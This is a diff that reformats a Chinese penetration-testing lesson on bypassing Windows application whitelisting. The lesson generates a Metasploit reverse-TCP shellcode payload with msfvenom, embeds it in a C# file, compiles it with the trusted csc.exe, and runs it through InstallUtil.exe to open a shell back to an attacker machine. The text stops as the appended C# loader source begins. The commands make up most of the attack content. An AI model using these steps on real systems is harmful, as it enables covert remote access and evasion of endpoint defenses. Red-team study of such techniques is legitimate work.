@@ -1,45 +1,48 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，身体特别重要。
 
-**Csc.exe简介：**
+### Csc.exe简介：
 
 C#的在Windows平台下的编译器名称是Csc.exe，如果你的.NET FrameWork SDK安装在C盘，那么你可以在C:\WINNT\Microsoft.NET\Framework\xxxxx目录中发现它。为了使用方便，你可以手动把这个目录添加到Path环境变量中去。用Csc.exe编译HelloWorld.cs非常简单，打开命令提示符，并切换到存放
-test.cs文件的目录中，输入下列行命令:csc /target:exe test.cs 将Ttest.cs编译成名为test.exe的console应用程序
+test.cs文件的目录中，输入下列行命令:`csc /target:exe test.cs` 将Ttest.cs 编译成名为 test.exe 的 console 应用程序
 
-**说明：**Csc.exe所在路径没有被系统添加PATH环境变量中，因此，csc命令无法识别。
+**说明：** Csc.exe所在路径没有被系统添加PATH环境变量中，因此，csc命令无法识别。
 
-**基于白名单Csc.exe配置payload：**
+### 基于白名单Csc.exe配置payload：
 
 Windows 7 默认位置：
-`C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe
-C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
+```bash
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe
+```
 
-**攻击机：**192.168.1.4 Debian
+**攻击机：**192.168.1.4 Debian  
 **靶机：**192.168.1.5 Windows 7
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ![](media/11038c8eb1bb179e7f838fd9cacc18bc.jpg)
 
-**配置payload：**
-`msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp`
+### 配置payload：
+```bash
+msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp
+```
 ![](media/0d4d8972d612f1578e72bbfd6b9acd17.jpg)
 
-copy buf 到 Micropoor_Csc.cs shellcode中。
+copy buf 到 Micropoor_Csc.cs shellcode 中。  
 ![](media/9e59f8c6977c4a11fa1cc86996043b31.jpg)
 
-**靶机执行：**
-`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Mic opoor.exe /platform:x64 /unsafe C:\Users\John\Desktop\Micropoor_Csc.cs
-`
+### 靶机执行：
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Mic opoor.exe /platform:x64 /unsafe C:\Users\John\Desktop\Micropoor_Csc.cs
+```
 
-`
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\John\Desktop\Micropoor.exe`
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\John\Desktop\Micropoor.exe
+```
 ![](media/04e49b7638caec7568dd6d7957b2e701.jpg)
 
 **与第七十二课相比，payload更为灵活。**
 
-**附录：Micropoor_Csc.cs**
+### 附录：Micropoor_Csc.cs
 
 ```c#
 using System;
